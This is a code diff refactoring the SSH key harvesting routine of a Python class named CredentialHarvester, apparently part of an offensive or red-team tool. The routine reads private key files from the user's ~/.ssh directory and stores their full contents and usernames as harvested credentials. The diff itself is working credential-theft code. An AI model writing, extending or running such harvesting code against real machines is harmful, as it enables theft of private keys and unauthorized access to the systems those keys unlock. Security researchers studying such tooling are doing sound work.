@@ -156,39 +156,46 @@ class CredentialHarvester:
             r"token\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
         ]
 
+    def _try_harvest_ssh_key(self, key_path: Path) -> Credential | None:
+        """Try to harvest a single SSH key file."""
+        try:
+            content = key_path.read_text()
+            if "PRIVATE KEY" not in content:
+                return None
+
+            username = self._get_ssh_username(str(key_path))
+            cred = Credential(
+                username=username or os.getenv("USER", "unknown"),
+                domain="",
+                credential_type=CredentialType.SSH_KEY,
+                value=content,
+                source=str(key_path),
+                metadata={"encrypted": "ENCRYPTED" in content},
+            )
+            logger.info("Found SSH key: %s", key_path)
+            return cred
+        except PermissionError:
+            logger.debug("Permission denied reading SSH key: %s", key_path)
+        except Exception as e:
+            logger.debug("Error reading SSH key {key_path}: %s", e)
+        return None
+
     def harvest_ssh_keys(self) -> list[Credential]:
         """Harvest SSH private keys from common locations."""
         found = []
         ssh_dir = Path.home() / ".ssh"
 
-        if ssh_dir.exists():
-            for key_file in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
-                key_path = ssh_dir / key_file
-                if key_path.exists():
-                    try:
-                        content = key_path.read_text()
+        if not ssh_dir.exists():
+            return found
 
-                        # Check if it's actually a private key
-                        if "PRIVATE KEY" in content:
-                            # Try to get username from known_hosts or config
-                            username = self._get_ssh_username(str(key_path))
-
-                            cred = Credential(
-                                username=username or os.getenv("USER", "unknown"),
-                                domain="",
-                                credential_type=CredentialType.SSH_KEY,
-                                value=content,
-                                source=str(key_path),
-                                metadata={"encrypted": "ENCRYPTED" in content},
-                            )
-                            found.append(cred)
-                            self.harvested.append(cred)
-                            logger.info("Found SSH key: %s", key_path)
-
-                    except PermissionError:
-                        logger.debug("Permission denied reading SSH key: %s", key_path)
-                    except Exception as e:
-                        logger.debug("Error reading SSH key {key_path}: %s", e)
+        for key_file in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
+            key_path = ssh_dir / key_file
+            if not key_path.exists():
+                continue
+            cred = self._try_harvest_ssh_key(key_path)
+            if cred:
+                found.append(cred)
+                self.harvested.append(cred)
 
         return found
 
